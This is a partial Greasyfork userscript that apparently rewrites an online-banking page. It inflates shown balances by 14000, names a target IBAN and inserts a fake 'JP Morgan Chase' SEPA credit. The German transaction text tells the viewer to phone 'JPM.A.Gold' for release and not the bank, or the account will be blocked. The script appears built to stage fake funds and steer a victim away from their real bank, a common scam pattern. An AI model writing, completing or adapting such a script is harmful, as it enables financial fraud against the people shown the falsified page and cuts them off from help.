// ==UserScript==
// @name         Ed 4Rec  post.gaukeloskar@yahoo.de
...
// @downloadURL https://update.greasyfork.org/scripts/525399/Ed%204Rec%20%20postgaukeloskar%40yahoode.user.js
// @updateURL https://update.greasyfork.org/scripts/525399/Ed%204Rec%20%20postgaukeloskar%40yahoode.meta.js
// ==/UserScript==
...
// FINUEBER
  ...
  const MBALANCE_CONFIGS = [
    ...
    { index: 1, adjustmentAmount: 14000 },
...
// UMSATZE BALANCE
  const ADJUSTMENT_AMOUNT = 14000.0;
  const TARGET_IBAN = 'DE48 3601 0043 0951 5834 34';
      ...
      rows: [
        {
          ...
          initials: 'JP',
          title: 'JP Morgan Chase',
          details: 'GFreigabe über JPM.A.Gold anrufen, nicht Bank, sonst gesperrt.',
          type: 'SEPA Gutschrift',
          date: '11.08.2025',
